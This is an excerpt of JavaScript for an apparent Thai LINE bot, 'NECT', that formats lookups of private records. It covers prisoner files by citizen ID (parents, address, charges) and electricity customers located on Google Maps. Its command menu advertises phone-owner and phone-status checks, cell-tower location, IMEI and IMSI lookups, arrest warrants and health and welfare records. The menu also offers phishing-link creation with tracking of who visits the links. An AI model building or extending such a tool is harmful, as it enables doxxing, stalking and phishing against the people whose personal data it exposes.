    let x = Math.floor(parseFloat(xUtm));
    let y = Math.floor(parseFloat(yUtm));
    if (isNaN(x) || isNaN(y)) return null;
    x = (x - 500000.0) / UTM_CONSTANTS.UTMScaleFactor;
    if (southhemi) y -= 10000000.0;
    y /= UTM_CONSTANTS.UTMScaleFactor;
    const latlon = [0, 0];
    mapXYToLatLon(x, y, utmCentralMeridian(zone), latlon);
    const lat = radToDeg(latlon[0]);
    const lon = radToDeg(latlon[1]);
    if (lat < 5 || lat > 21 || lon < 97 || lon > 106) return null;
    return { lat: lat.toFixed(6), lon: lon.toFixed(6) };
  } catch (e) {
    return null;
  }
}

function formatLatLonLink(posX, posY) {
  const latLon = convertUTMToLatLon(posX, posY, 47, false);
  if (!latLon) return '';
  return `
 Lat: ${latLon.lat}, Lon: ${latLon.lon}
 Google Maps: https://www.google.com/maps?q=${latLon.lat},${latLon.lon}`;
}

function formatPrisonerAddress(item) {
  const addrParts = [];
  if (item.addressNoText) addrParts.push(`เลขที่ ${item.addressNoText}`);
  if (item.addressMooText) addrParts.push(`หมู่ ${item.addressMooText}`);
  if (item.addressMooBanText) addrParts.push(`หมู่บ้าน ${item.addressMooBanText}`);
  if (item.addressSoiText) addrParts.push(`ซอย ${item.addressSoiText}`);
  if (item.addressRoadText) addrParts.push(`ถนน ${item.addressRoadText}`);
  if (item.addressTumbonText) addrParts.push(`ต.${item.addressTumbonText}`);
  if (item.addressAmphurText) addrParts.push(`อ.${item.addressAmphurText}`);
  if (item.addressProvinceText) addrParts.push(`จ.${item.addressProvinceText}`);
  if (item.addressPostCode) addrParts.push(`${item.addressPostCode}`);
  return addrParts.join(' ') || '-';
}

function getPrisonerContent(data) {
  if (Array.isArray(data?.content)) return data.content;
  if (Array.isArray(data?.data?.content)) return data.data.content;
  if (Array.isArray(data?.data)) return data.data;
  if (Array.isArray(data)) return data;
  return [];
}

function formatPrisonerRecords(data, input, isRemand = false) {
  const content = getPrisonerContent(data);
  const label = isRemand ? 'ผู้ต้องขัง (ยังไม่พิพากษา)' : 'ผู้ต้องขัง';
  if (data?.success === false && !content.length) {
    return `❌ ${data.message || `ไม่พบข้อมูล${label} สำหรับ "${input}"`}`;
  }
  if (!content.length) return `❌ ไม่พบข้อมูล${label} สำหรับ "${input}"`;

  let msg = ` ข้อมูล${label}: ${input}
────────────
`;
  content.forEach((item, idx) => {
    const sex = item.sex === 'MALE' ? 'ชาย' : item.sex === 'FEMALE' ? 'หญิง' : item.sex || '-';
    const fatherName = `${item.fatherPrefix || ''}${item.fatherFirstName || '-'} ${item.fatherLastName || ''}`.trim();
    const motherName = `${item.motherPrefix || ''}${item.motherFirstName || '-'} ${item.motherLastName || ''}`.trim();

    if (isRemand) {
      msg += `[${idx + 1}]\n`;

      msg += `◇ ชื่อและนามสกุล
  ${item.firstName || '-'} ${item.lastName || '-'}\n`;
      msg += `◇ หมายเลขบัตร
  ${item.citizenCardNumber || '-'}\n`;
      msg += `◇ วันเดือนปีเกิด
  ${item.dateOfBirth || '-'}\n`;
      msg += `• เพศ: ${sex}\n`;
      msg += `◇ สัญชาติที่ระบุ
  ${item.nationality || '-'}\n`;
      msg += `• ศาสนา: ${item.religious || '-'}\n`;
      msg += `• การศึกษา: ${item.educationLevel || '-'} (${item.educationSchool || '-'})\n`;

      msg += `• เรือนจำ: ${item.prisonName || '-'}\n`;
      msg += `◇ หมายเลขผู้ต้องขัง
  ${item.prisonerId || '-'}\n`;
      msg += `◇ วันที่รับตัว
  ${item.receiveDate || '-'}\n`;
      msg += `◇ วันที่ปล่อยตัว
  ${item.releaseDate || '-'}\n`;
      msg += `◇ รายการข้อหา
  ${item.allegation || '-'}\n`;
      msg += `◇ เลขคดีแดง/ดำ
  ${item.decidedCaseId || '-'} / ${item.undecidedCaseId || '-'}\n`;
      msg += `• ศาล: ${item.courtName || '-'}\n`;
      msg += `◇ วันที่ตัดสินคดี
  ${item.sentenceDate || '-'}\n`;

      msg += `• บิดา: ${fatherName}\n`;
      msg += `• มารดา: ${motherName}\n`;
      msg += `◇ รายละเอียดที่อยู่
  ${formatPrisonerAddress(item)}\n`;
      msg += `────────────
`;
      return;
    }

    msg += `[${idx + 1}]\n`;
    msg += `◇ ชื่อและนามสกุล
  ${item.firstName || '-'} ${item.lastName || '-'}\n`;
    msg += `◇ หมายเลขบัตร
  ${item.citizenCardNumber || '-'}\n`;
    msg += `◇ วันเดือนปีเกิด
  ${item.dateOfBirth || '-'}\n`;
    msg += `• เพศ: ${sex}\n`;
    msg += `◇ สัญชาติที่ระบุ
  ${item.nationality || '-'}\n`;
    msg += `• ศาสนา: ${item.religious || '-'}\n`;
    msg += `• การศึกษา: ${item.educationLevel || '-'} (${item.educationSchool || '-'} ${item.educationProvince || '-'})\n`;
    msg += `• เรือนจำ: ${item.prisonName || '-'}\n`;
    msg += `◇ หมายเลขผู้ต้องขัง
  ${item.prisonerId || '-'}\n`;
    msg += `◇ วันที่รับตัว
  ${item.receiveDate || '-'}\n`;
    msg += `◇ วันที่ปล่อยตัว
  ${item.releaseDate || '-'}\n`;
    msg += `◇ รายการข้อหา
  ${item.allegation || '-'}\n`;
    msg += `◇ เลขคดีแดง/ดำ
  ${item.decidedCaseId || '-'} / ${item.undecidedCaseId || '-'}\n`;
    msg += `• ศาล: ${item.courtName || '-'}\n`;
    msg += `◇ วันที่ตัดสินคดี
  ${item.sentenceDate || '-'}\n`;
    msg += `• บิดา: ${fatherName}\n`;
    msg += `• มารดา: ${motherName}\n`;
    msg += `◇ รายละเอียดที่อยู่
  ${formatPrisonerAddress(item)}\n`;
    msg += `────────────
`;
  });

  msg += isRemand ? `แสดงทั้งหมด ${content.length} รายการ` : `แสดง ${content.length} รายการ`;
  return limitLineMessage(msg);
}

function formatPrisonerRecordsFlex(data, input, isRemand = false) {

  const content = getPrisonerContent(data);

  const label = isRemand
    ? 'ผู้ต้องขัง (ยังไม่พิพากษา)'
    : 'ผู้ต้องขัง';

  if (data?.success === false && !content.length) {
    return {
      type: 'text',
      text: `❌ ${data.message || `ไม่พบข้อมูล${label} สำหรับ "${input}"`}`
    };
  }

  if (!content.length) {
    return {
      type: 'text',
      text: `❌ ไม่พบข้อมูล${label} สำหรับ "${input}"`
    };
  }

  const sv = (value, fallback = '-') => {
    if (value === null || value === undefined) return fallback;

    const text = String(value).trim();

    return text ? text : fallback;
  };


  // จำกัดสูงสุด 10 Bubble
  const bubbles = content
    .slice(0, 10)
    .map((item, idx) => {

      const sex =
        item.sex === 'MALE'
          ? 'ชาย'
          : item.sex === 'FEMALE'
            ? 'หญิง'
            : sv(item.sex);

      const fatherName =
        `${item.fatherPrefix || ''}${item.fatherFirstName || '-'} ${item.fatherLastName || ''}`.trim();

      const motherName =
        `${item.motherPrefix || ''}${item.motherFirstName || '-'} ${item.motherLastName || ''}`.trim();

      const fullName =
        `${item.firstName || '-'} ${item.lastName || '-'}`.trim();

      const address =
        formatPrisonerAddress(item) || '-';


      // ================================
      // ข้อมูลส่วนบุคคล
      // ================================
      const bodyContents = [

        {
          type: 'text',
          text: " ▸ รายละเอียดของบุคคล",
          weight: 'bold',
          size: 'md',
          color: '#0F172A'
        },

        {
          type: 'text',
          text:
            `◇ ชื่อและนามสกุล
  ${fullName}\n` +
            `◇ หมายเลขบัตร
  ${sv(item.citizenCardNumber)}\n` +
            `◇ วันเดือนปีเกิด
  ${sv(item.dateOfBirth)}\n` +
            `เพศ: ${sex}\n` +
            `◇ สัญชาติที่ระบุ
  ${sv(item.nationality)}\n` +
            `ศาสนา: ${sv(item.religious)}`,
          wrap: true,
          size: 'sm',
          color: '#334155',
          margin: 'md'
        },

        {
          type: 'separator',
          margin: 'lg'
        },

        // ================================
        // การศึกษา
        // ================================
        {
          type: 'text',
          text: " ข้อมูลการศึกษา",
          weight: 'bold',
          size: 'md',
          color: '#0F172A',
          margin: 'lg'
        },

        {
          type: 'text',
          text:
            isRemand
              ? `ระดับ: ${sv(item.educationLevel)}\n` +
                `สถานศึกษา: ${sv(item.educationSchool)}`
              : `ระดับ: ${sv(item.educationLevel)}\n` +
                `สถานศึกษา: ${sv(item.educationSchool)}\n` +
                `◇ จังหวัดที่ระบุ
  ${sv(item.educationProvince)}`,
          wrap: true,
          size: 'sm',
          color: '#334155'
        },

        {
          type: 'separator',
          margin: 'lg'
        },

        // ================================
        // ข้อมูลเรือนจำ / คดี
        // ================================
        {
          type: 'text',
          text: " ▸ รายละเอียดคดีและเรือนจำ",
          weight: 'bold',
          size: 'md',
          color: '#0F172A',
          margin: 'lg'
        },

        {
          type: 'text',
          text:
            `เรือนจำ: ${sv(item.prisonName)}\n` +
            `◇ หมายเลขผู้ต้องขัง
  ${sv(item.prisonerId)}\n` +
            `◇ วันที่รับตัว
  ${sv(item.receiveDate)}\n` +
            `◇ วันที่ปล่อยตัว
  ${sv(item.releaseDate)}\n` +
            `◇ รายการข้อหา
  ${sv(item.allegation)}\n` +
            `◇ เลขคดีแดง/ดำ
  ${sv(item.decidedCaseId)} / ${sv(item.undecidedCaseId)}\n` +
            `ศาล: ${sv(item.courtName)}\n` +
            `◇ วันที่ตัดสินคดี
  ${sv(item.sentenceDate)}`,
          wrap: true,
          size: 'sm',
          color: '#334155'
        },

        {
          type: 'separator',
          margin: 'lg'
        },

        // ================================
        // ครอบครัว
        // ================================
        {
          type: 'text',
          text: " ข้อมูลครอบครัว",
          weight: 'bold',
          size: 'md',
          color: '#0F172A',
          margin: 'lg'
        },

        {
          type: 'text',
          text:
            `บิดา: ${fatherName}\n` +
            `มารดา: ${motherName}`,
          wrap: true,
          size: 'sm',
          color: '#334155'
        },

        {
          type: 'separator',
          margin: 'lg'
        },

        // ================================
        // ที่อยู่
        // ================================
        {
          type: 'text',
          text: "รายละเอียดที่อยู่",
          weight: 'bold',
          size: 'md',
          color: '#0F172A',
          margin: 'lg'
        },

        {
          type: 'text',
          text: address,
          wrap: true,
          size: 'sm',
          color: '#334155'
        }
      ];


      return {
        type: 'bubble',
        size: 'mega',

        header: {
          type: 'box',
          layout: 'vertical',
          backgroundColor: isRemand
            ? '#92400E'
            : '#7F1D1D',
          paddingAll: '18px',

          contents: [
            {
              type: 'text',
              text: ` ${label}`,
              weight: 'bold',
              size: 'lg',
              color: '#FFFFFF',
              wrap: true
            },

            {
              type: 'text',
              text: `รายการ ${idx + 1} จาก ${content.length}`,
              size: 'sm',
              color: '#FDE68A',
              margin: 'sm'
            },

            {
              type: 'text',
              text: fullName,
              size: 'xl',
              weight: 'bold',
              color: '#FFFFFF',
              margin: 'md',
              wrap: true
            }
          ]
        },

        body: {
          type: 'box',
          layout: 'vertical',
          paddingAll: '18px',
          spacing: 'sm',
          contents: bodyContents
        }
      };
    });


  return {
    type: 'flex',
    altText: `ข้อมูล${label} พบ ${content.length} รายการ`,

    contents: {
      type: 'carousel',
      contents: bubbles
    }
  };
}

function formatPEAMeterRecords(peaData, title, page = 0, exactName = '') {
  let records = Array.isArray(peaData?.MESSAGE) ? peaData.MESSAGE : [];

  if (exactName) {
    const keywordFull = exactName.replace(/\s+/g, ' ').trim().toLowerCase();
    records = records.filter(item => {
      const data = item.data || {};
      const nameInData = `${(data.CUSTOMERNAME || '').trim()} ${(data.CUSTOMERSIRNAME || '').trim()}`
        .replace(/\s+/g, ' ')
        .toLowerCase()
        .trim();
      return nameInData === keywordFull;
    });
  }

  if (!peaData?.SUCCESS || !records.length) return 'ไม่พบข้อมูลสำหรับเงื่อนไขที่ระบุ';

  const itemsPerPage = 5;
  const totalPages = Math.ceil(records.length / itemsPerPage);
  page = parseInt(page, 10);
  if (isNaN(page) || page < 0) page = 0;
  if (page >= totalPages) return `ไม่พบข้อมูลหน้าที่ ${page + 1} (มีทั้งหมด ${totalPages} หน้า)`;

  const startIndex = page * itemsPerPage;
  const pageItems = records.slice(startIndex, startIndex + itemsPerPage);
  let result = `${title} (หน้า ${page + 1}/${totalPages})
────────────
`;

  pageItems.forEach((item, index) => {
    const data = item.data || {};
    result += `
 รายการที่ ${startIndex + index + 1}
 ▸ รายละเอียดผู้ใช้บริการไฟฟ้า
◇ ชื่อและนามสกุล
  ${(data.PREFIX || '')}${data.CUSTOMERNAME || ''} ${data.CUSTOMERSIRNAME || ''}
◇ หมายเลข CA
  ${data.CA || '-'}
◇ หมายเลขมิเตอร์
  ${data.PEANO || '-'}
◇ รายละเอียดที่อยู่
  ${[
        data.ADDRESSNO,
        data.MOO && data.MOO !== '-' ? `หมู่ ${data.MOO}` : '',
        data.TUMBOL ? `ต.${data.TUMBOL}` : '',
        data.AMPHOE ? `อ.${data.AMPHOE}` : '',
        data.CHANGWAT ? `จ.${data.CHANGWAT}` : '',
        data.POSTCODE ? `รหัสไปรษณีย์ ${data.POSTCODE}` : ''
      ].filter(Boolean).join(' ') || '-'}
พิกัด GPS: X=${data.POS_X || '-'} Y=${data.POS_Y || '-'}
${formatLatLonLink(data.POS_X, data.POS_Y)}
────────────`;
  });

  result += `
 แสดง ${pageItems.length} จาก ${records.length} รายการ`;
  return limitLineMessage(result);
}

function buildPEANFlex(peaData, title, page = 0, exactName = '') {
  let records = Array.isArray(peaData?.MESSAGE) ? peaData.MESSAGE : [];

  if (exactName) {
    const keywordFull = exactName.replace(/\s+/g, ' ').trim().toLowerCase();
    records = records.filter(item => {
      const d = item.data || {};
      const full = `${d.CUSTOMERNAME || ''} ${d.CUSTOMERSIRNAME || ''}`
        .replace(/\s+/g, ' ')
        .trim()
        .toLowerCase();
      return full === keywordFull;
    });
  }

  if (!peaData?.SUCCESS || !records.length) {
    return { type: 'text', text: 'ไม่พบข้อมูลสำหรับเงื่อนไขที่ระบุ' };
  }

  const itemsPerPage = 5;
  const totalPages = Math.ceil(records.length / itemsPerPage);
  page = isNaN(parseInt(page)) ? 0 : parseInt(page);

  const startIndex = page * itemsPerPage;
  const pageItems = records.slice(startIndex, startIndex + itemsPerPage);

  return {
    type: 'flex',
    altText: `${title} หน้า ${page + 1}/${totalPages}`,
    contents: {
      type: 'carousel',
      contents: pageItems.map((item, index) => {
        const d = item.data || {};
        const latLon = convertUTMToLatLon(d.POS_X, d.POS_Y, 47, false);

        const fullname = `${d.PREFIX || ''}${d.CUSTOMERNAME || ''} ${d.CUSTOMERSIRNAME || ''}`.trim();

        const address = [
          d.ADDRESSNO,
          d.MOO && d.MOO !== '-' ? `หมู่ ${d.MOO}` : '',
          d.TUMBOL ? `ต.${d.TUMBOL}` : '',
          d.AMPHOE ? `อ.${d.AMPHOE}` : '',
          d.CHANGWAT ? `จ.${d.CHANGWAT}` : '',
          d.POSTCODE ? d.POSTCODE : ''
        ].filter(Boolean).join(' ');

        return {
          type: 'bubble',
          size: 'mega',
          header: {
            type: 'box',
            layout: 'vertical',
            backgroundColor: '#0F172A',
            paddingAll: '16px',
            contents: [
              {
                type: 'text',
                text: ` รายการที่ ${startIndex + index + 1}`,
                color: '#FFFFFF',
                weight: 'bold',
                size: 'lg'
              },
              {
                type: 'text',
                text: title,
                color: '#CBD5E1',
                size: 'sm',
                margin: 'sm'
              }
            ]
          },
          body: {
            type: 'box',
            layout: 'vertical',
            spacing: 'md',
            contents: [
              infoLine("ชื่อและนามสกุล", fullname || '-'),
              infoLine('เลข CA', d.CA || '-'),
              infoLine("หมายเลขมิเตอร์", d.PEANO || '-'),
              infoLine("รายละเอียดที่อยู่", address || '-'),
              infoLine("ตำแหน่งพิกัด", latLon ? `${latLon.lat}, ${latLon.lon}` : '-')
            ]
          },
          footer: {
            type: 'box',
            layout: 'vertical',
            contents: [
              {
                type: 'button',
                style: 'primary',
                color: '#2563EB',
                action: latLon
                  ? {
                    type: 'uri',
                    label: 'เปิด Google Map',
                    uri: `https://www.google.com/maps?q=${latLon.lat},${latLon.lon}`
                  }
                  : {
                    type: 'message',
                    label: 'ไม่มีพิกัด',
                    text: 'ไม่มีพิกัด'
                  }
              }
            ]
          }
        };
      })
    }
  };
}

function formatPEAAddressRecords(peaData, page = 0) {
  const records = Array.isArray(peaData?.MESSAGE) ? peaData.MESSAGE : [];
  if (!peaData?.SUCCESS || !records.length) return 'ไม่พบข้อมูลสำหรับที่อยู่ที่ระบุ';

  const itemsPerPage = 5;
  const totalPages = Math.ceil(records.length / itemsPerPage);
  page = parseInt(page, 10);
  if (isNaN(page) || page < 0) page = 0;
  if (page >= totalPages) return `ไม่พบข้อมูลหน้าที่ ${page + 1} (มีทั้งหมด ${totalPages} หน้า)`;

  const startIndex = page * itemsPerPage;
  const pageItems = records.slice(startIndex, startIndex + itemsPerPage);
  let result = ` ข้อมูลมิเตอร์ไฟฟ้าตามที่อยู่ (หน้า ${page + 1}/${totalPages})
────────────
`;

  pageItems.forEach((item, index) => {
    const parts = String(item.id || '').split(';');
    result += `
 รายการที่ ${startIndex + index + 1}
◇ รายละเอียดที่อยู่
  ${item.name || '-'}
◇ หมายเลข CA
  ${parts[1] || 'ไม่ระบุ'}
◇ หมายเลขมิเตอร์
  ${parts[2] || 'ไม่ระบุ'}
◇ รหัสประจำลูกค้า
  ${parts[3] || 'ไม่ระบุ'}
 รหัสอ้างอิง: ${item.id || '-'}
────────────`;
  });

  result += `
 แสดง ${pageItems.length} จาก ${records.length} รายการ`;
  return limitLineMessage(result);
}

function buildPEAUFlex(peaData, page = 0) {
  const records = Array.isArray(peaData?.MESSAGE) ? peaData.MESSAGE : [];

  if (!peaData?.SUCCESS || !records.length) {
    return { type: 'text', text: 'ไม่พบข้อมูลสำหรับที่อยู่ที่ระบุ' };
  }

  const itemsPerPage = 5;
  const totalPages = Math.ceil(records.length / itemsPerPage);
  page = isNaN(parseInt(page)) ? 0 : parseInt(page);

  const startIndex = page * itemsPerPage;
  const pageItems = records.slice(startIndex, startIndex + itemsPerPage);

  return {
    type: 'flex',
    altText: `ข้อมูลมิเตอร์ไฟฟ้าตามที่อยู่ หน้า ${page + 1}/${totalPages}`,
    contents: {
      type: 'carousel',
      contents: pageItems.map((item, index) => {
        const parts = String(item.id || '').split(';');
        const ca = parts[1] || '';
        const peano = parts[2] || '';
        const customerId = parts[3] || '';

        return {
          type: 'bubble',
          size: 'mega',
          header: {
            type: 'box',
            layout: 'vertical',
            backgroundColor: '#0F172A',
            paddingAll: '16px',
            contents: [
              {
                type: 'text',
                text: ` รายการที่ ${startIndex + index + 1}`,
                color: '#FFFFFF',
                weight: 'bold',
                size: 'lg'
              },
              {
                type: 'text',
                text: 'ข้อมูลมิเตอร์ไฟฟ้าตามที่อยู่',
                color: '#CBD5E1',
                size: 'sm',
                margin: 'sm'
              }
            ]
          },
          body: {
            type: 'box',
            layout: 'vertical',
            spacing: 'md',
            contents: [
              infoLine("รายละเอียดที่อยู่", item.name || '-'),
              infoLine('เลข CA', ca || '-'),
              infoLine("หมายเลขมิเตอร์", peano || '-'),
              infoLine("รหัสประจำลูกค้า", customerId || '-'),
              infoLine('รหัสอ้างอิง', item.id || '-')
            ]
          },
          footer: {
            type: 'box',
            layout: 'vertical',
            spacing: 'sm',
            contents: [
              {
                type: 'button',
                style: 'primary',
                color: '#2563EB',
                action: {
                  type: 'message',
                  label: 'ดูข้อมูลจากเลข CA',
                  text: ca ? `peac@${ca}` : 'ไม่พบเลข CA'
                }
              }
            ]
          }
        };
      })
    }
  };
}

function formatPEABillHistory(billResponseData, ca, peano) {
  if (!billResponseData?.result || !Array.isArray(billResponseData?.data)) {
    return '❌ ไม่สามารถดึงข้อมูลได้: ' + (billResponseData?.message || 'ระบบขัดข้อง');
  }

  const billData = billResponseData.data;
  if (!billData.length) return '❌ ไม่พบข้อมูลประวัติการชำระเงินของหมายเลขนี้';

  let msg = ` ▸ รายการย้อนหลังการใช้ไฟฟ้า (PEA)
 CA: ${ca} | PEA NO: ${peano}
────────────
`;
  billData.forEach(item => {
    msg += `◇ เดือนของงวด
  ${item.billperiod}\n`;
    msg += `◇ จำนวนหน่วยที่ใช้
  ${item.unit} หน่วย\n`;
    msg += `• ยอดเงิน: ${Number(item.totalAmountPay).toLocaleString()} บาท\n`;
    msg += `◇ วันชำระเงิน
  ${item.paydate || 'ยังไม่ได้ชำระ'}\n`;
    msg += `────────────
`;
  });

  return limitLineMessage(msg);
}

function infoLine(label, value) {
  return {
    type: 'box', layout: 'vertical', spacing: 'xs',
    backgroundColor: '#F1F5FB', cornerRadius: '10px', paddingAll: '10px',
    contents: [
      { type: 'text', text: label, size: 'xs', color: '#52677D', wrap: true },
      { type: 'text', text: String(value || '-'), size: 'sm', color: '#172B4D', weight: 'bold', wrap: true }
    ]
  };
}

function menuSection(title, lines) {
  return {
    type: 'box',
    layout: 'vertical',
    backgroundColor: '#F8FAFC',
    cornerRadius: '12px',
    paddingAll: '12px',
    contents: [
      {
        type: 'text',
        text: title,
        weight: 'bold',
        size: 'md',
        color: '#111827',
        wrap: true
      },
      ...lines.map((line) => ({
        type: 'text',
        text: line,
        size: 'sm',
        color: '#374151',
        wrap: true,
        margin: 'sm'
      }))
    ]
  };
}

function buildMenuFooter() {
  return {
    type: 'box',
    layout: 'vertical',
    spacing: 'sm',
    contents: [
      {
        type: 'button',
        style: 'primary',
        color: '#2563EB',
        action: {
          type: 'message',
          label: 'สมัครสมาชิก',
          text: 'ยินยอมรับข้อตกลง'
        }
      },
      {
        type: 'button',
        style: 'secondary',
        action: {
          type: 'message',
          label: 'เช็กสถานะ',
          text: 'สถานะการสมัคร'
        }
      },
      {
        type: 'button',
        style: 'secondary',
        action: {
          type: 'message',
          label: 'เมนูหลัก',
          text: 'menu%'
        }
      }
    ]
  };
}

// Shared public menu text; command handling remains separate.
function buildMenuText() {
  return `🧭 NECT · เลือกงานค้นหา
────────────────
เลือกกลุ่มงาน แล้วเติมข้อมูลต่อท้ายคำสั่ง
วิธีส่ง: ชื่อคำสั่ง@ข้อมูลที่ต้องการ
ลองพิมพ์ d@0812345678
กลับมาที่คู่มือนี้ได้ด้วย menu%

〔01〕🗺️ พิกัดและจุดให้บริการ
map@ละติจูด,ลองจิจูด
   ↳ สร้างลิงก์แผนที่จากพิกัดที่ระบุ

dis@พิกัดต้นทาง/พิกัดปลายทาง
   ↳ หาระยะห่างระหว่างพิกัดสองจุด

atm@รหัสตู้
   ↳ ระบุตำแหน่งติดตั้งตู้ ATM จากรหัสตู้

bn@ชื่อธนาคาร/รหัสสาขา
   ↳ ค้นรายละเอียดธนาคารและรหัสสาขา

b@mcc/mnc/lac/cid
   ↳ แปลงข้อมูลเสาสัญญาณเป็นพิกัดพื้นที่

se@รหัสสาขา 7-11
   ↳ เรียกดูรายละเอียดสาขา 7-11

────────────────

〔02〕🚘 การเดินทางและข้อมูลรถ
car@จังหวัด หมวด ตัวเลข ประเภทรถ
   ↳ เรียกดูข้อมูลรถตามทะเบียนและจังหวัด
   ลองส่ง: car@กรุงเทพ 1กก 334 1

cid@เลขบัตร
   ↳ ค้นรายการรถที่ผูกกับเลขบัตรประชาชน

dl@เลขบัตร
   ↳ แสดงข้อมูลใบอนุญาตขับขี่ตามเลขบัตร

tro@หมวดอักษร หมวดตัวเลข จังหวัด
   ↳ ส่งคำขอตรวจข้อมูลเข้า ตรอ.
   ลองส่ง: tro@1กก 334 กรุงเทพ

bq@เบอร์โทร/เลขบัตร
   ↳ ดูข้อมูลลูกค้าและการใช้บริการศูนย์รถ

pt@
   ↳ อ่านป้ายทะเบียนพร้อมวิเคราะห์ลักษณะรถจากภาพ
   ส่งภาพเมื่อระบบแจ้งขั้นตอนให้แล้ว

────────────────

〔03〕📶 เครือข่ายการติดต่อ
net@เบอร์โทร 10 หลัก
   ↳ ดูผู้ให้บริการของหมายเลขโทรศัพท์

on@เบอร์โทร 10 หลัก
   ↳ สำรวจสถานะเปิดหรือปิดเครื่องของหมายเลข
   ลองส่ง: on@0812345678

d@เบอร์โทร/เลขบัตร
   ↳ ค้นรายละเอียดผู้จดทะเบียน DTAC

t@เบอร์โทร/เลขบัตร/เลขพาสสปอร์ต/ชื่อ สกุล
   ↳ ค้นข้อมูลผู้จดทะเบียนหมายเลข True

tid@เลขบัตร
   ↳ ดูข้อมูล True Fiber ตามเลขบัตร

tv@เลขกล่อง
   ↳ ดูรายละเอียดจุดติดตั้ง True Online

────────────────

〔04〕📱 ตัวระบุอุปกรณ์
imei@เลข IMEI
   ↳ แสดงรายละเอียดอุปกรณ์จากเลข IMEI

imsi@เลข IMSI
   ↳ อ่านข้อมูลเครือข่ายจากเลข IMSI

icc@เลข ICCID
   ↳ ดูรายละเอียดซิมจากหมายเลข ICCID

ip@เลข IP
   ↳ สำรวจข้อมูลเครือข่ายจากหมายเลข IP

────────────────

〔05〕💧 น้ำและพลังงาน
pwa@
   ↳ เลือกดูรายชื่อสาขาของการประปา กปภ.
   ส่งคำสั่งนี้เพียงคำเดียว โดยไม่เติมข้อความต่อท้าย

pw@สาขา ชื่อ/ที่อยู่/หมายเลขมาตร
   ↳ เรียกดูจุดติดตั้งมาตรน้ำและเบอร์ติดต่อ กปภ.

pean@ชื่อ สกุล
   ↳ ค้นรายการผู้ใช้ไฟฟ้าด้วยชื่อและนามสกุล

peau@ที่อยู่
   ↳ ค้นรายการมาตรไฟฟ้าตามที่อยู่

peac@เลข CA
   ↳ เปิดข้อมูลผู้ใช้ไฟฟ้าตามหมายเลข CA

peab@เลข CA เลขมิเตอร์
   ↳ ดูย้อนหลังการใช้ไฟฟ้าของมาตรที่ระบุ

mea@ชื่อ สกุล
   ↳ ดูข้อมูลผู้ใช้ไฟฟ้า MEA (ยังไม่เปิดให้บริการ)

kru@เลขมิเตอร์
   ↳ ดูรายละเอียดมาตรไฟฟ้า (ยังไม่เปิดให้บริการ)

────────────────

〔06〕🛡️ สิทธิและบริการสมาชิก
si@เลขบัตร
   ↳ เรียกดูรายละเอียดสิทธิประกันสังคม

wf@เลขบัตร
   ↳ ดูสิทธิเบี้ยยังชีพและหน่วยงานรับผิดชอบ

kp@เลขบัตร/เลขสมาชิก
   ↳ ดูสถานะสมาชิกสหกรณ์ สก.ทบ.

h@เลขบัตร
   ↳ ส่งคำขอตรวจสอบข้อมูลการรักษา

cj@เบอร์โทร เลขบัตร
   ↳ ค้นข้อมูลสมาชิก CJ จากเบอร์และเลขบัตร

sc@เลขบัตร
   ↳ เรียกดูรายการประวัติการผ่อนสินค้า

f@เบอร์โทร
   ↳ ดูข้อมูลพัสดุด้วยหมายเลขโทรศัพท์

tic@เลขพัสดุ
   ↳ เปิดภาพหลักฐานรับพัสดุตามเลขติดตาม

────────────────

〔07〕🏢 หน่วยงานและทะเบียนธุรกิจ
nm@รหัสหน่วยบริการ/ชื่อสถานพยาบาล
   ↳ ค้นหน่วยบริการสุขภาพตามชื่อหรือรหัส

dc@ชื่อ สกุล
   ↳ เรียกดูข้อมูลแพทย์ตามชื่อที่ระบุ

dr@ชื่อ สกุล
   ↳ ค้นชื่อผู้ประกอบวิชาชีพด้านสาธารณสุข

dbd@เลขนิติบุคคล
   ↳ ดูรายละเอียดการจดทะเบียนของนิติบุคคล

for@เลขนิติบุคคล
   ↳ ค้นทะเบียนพาณิชย์และข้อมูลนิติบุคคล

lc@ชื่อ-สกุล,ชื่อบริษัท
   ↳ ค้นข้อมูลบริษัทและรายการใบอนุญาต

tisi@เลข มอก.
   ↳ ดูข้อมูลใบอนุญาตมาตรฐาน มอก.

tr@ชื่อผู้ประกอบการ
   ↳ ค้นรายละเอียดธุรกิจผู้ประกอบการขนส่ง

────────────────

〔08〕⚖️ กฎหมายและกระบวนการคดี
lw@คำถาม
   ↳ ส่งคำถามเพื่อค้นข้อมูลข้อกฎหมาย

pb@เลขบัตร
   ↳ ดูรายการข้อมูลการคุมประพฤติตามเลขบัตร

nb@เลขบัตร
   ↳ ค้นรายการประวัติคดีเกี่ยวกับยาเสพติด

c@เลขบัตร
   ↳ เรียกดูรายการหมายจับจาก CRIME

doc@เลขบัตร
   ↳ ดูรายการหมายจับที่ออกโดยศาล

ps@เลขบัตร
   ↳ ดูข้อมูลผู้ต้องขังที่คดียังไม่พิพากษา

psi@เลขบัตร
   ↳ ค้นรายการข้อมูลผู้ต้องขังในระบบ

────────────────

〔09〕💻 เว็บและเครื่องมือสื่อ
web@ชื่อเว็บไซต์
   ↳ สรุปข้อมูลโดเมนของเว็บไซต์ที่ระบุ

soc@Username/ชื่อโซเชียล
   ↳ รวบรวมข้อมูลบัญชีโซเชียลตามชื่อผู้ใช้

picf@URL
   ↳ แสดงรูปโปรไฟล์ Facebook จากลิงก์บัญชี

loa@ชื่อแอป
   ↳ ค้นรายละเอียดใบอนุญาตของแอปเงินกู้

ff@
   ↳ ประเมินความคล้ายของใบหน้าจากสองภาพ
   ส่งภาพเมื่อระบบแจ้งขั้นตอนให้แล้ว

cctv@เวลากล้อง,เวลาจริง
   ↳ คำนวณเวลาเหลื่อมของกล้องเทียบเวลาจริง

phis@URL
   ↳ สร้างลิงก์ Phishing จาก URL ปลายทาง

chphis@ID
   ↳ แสดงข้อมูลการเข้าชมลิงก์ Phishing

────────────────
รหัสที่ใช้กับ car@ อยู่ในคู่มือประเภทรถถัดไป`;
}

function buildVehicleTypeMenuText() {
  return `🚘 NECT · คู่มือประเภทรถ
────────────────
เลือกรหัสให้ตรงกับประเภทรถ แล้วใส่ท้าย car@

ใช้งานส่วนบุคคลและงานเฉพาะทาง
[1] รถยนต์นั่งไม่เกิน 7 คน
[2] รถยนต์นั่งเกิน 7 คน
[3] รถบรรทุกส่วนบุคคล
[4] สามล้อส่วนบุคคล
[12] จักรยานยนต์
[13] รถแทรกเตอร์
[14] รถบดถนน
[15] รถใช้ในงานเกษตรกรรม
[16] รถพ่วง

งานรับจ้างและรถบริการ
[5] รับจ้างระหว่างจังหวัด
[6] รับจ้างไม่เกิน 7 คน
[7] สี่ล้อเล็กรับจ้าง
[8] รับจ้างสามล้อ
